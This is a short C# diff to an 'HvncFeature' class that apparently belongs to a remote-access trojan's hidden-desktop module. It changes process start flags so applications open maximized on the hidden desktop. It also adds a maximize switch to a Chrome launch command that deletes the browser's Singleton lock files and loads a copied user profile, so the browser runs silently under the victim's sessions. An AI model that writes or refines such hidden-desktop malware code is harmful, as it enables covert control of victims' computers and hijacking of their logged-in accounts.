@@ -1755,8 +1755,8 @@ internal static class HvncFeature
                 lpDesktop   = deskPtr,
                 dwX         = 0,
                 dwY         = 0,
-                dwFlags     = STARTF_USEPOSITION | (isConsoleApp ? STARTF_USESHOWWINDOW : 0u),
-                wShowWindow = isConsoleApp ? (ushort)1 /*SW_SHOWNORMAL*/ : (ushort)0
+                dwFlags     = STARTF_USEPOSITION | STARTF_USESHOWWINDOW,
+                wShowWindow = (ushort)3 // SW_SHOWMAXIMIZED — ensure app fills the hidden desktop
             };
 
             string cmd;
@@ -1781,6 +1781,7 @@ internal static class HvncFeature
                 foreach (var lk in new[] { "SingletonLock", "SingletonSocket", "SingletonCookie" })
                     try { File.Delete(Path.Combine(hvncProfile, lk)); } catch { }
                 cmd += $" --user-data-dir=\"{hvncProfile}\"" +
+                       " --start-maximized" +
                        " --no-first-run --no-default-browser-check --disable-default-apps" +
                        " --disable-background-mode --disable-background-networking" +
                        " --noerrdialogs --disable-session-crashed-bubble" +
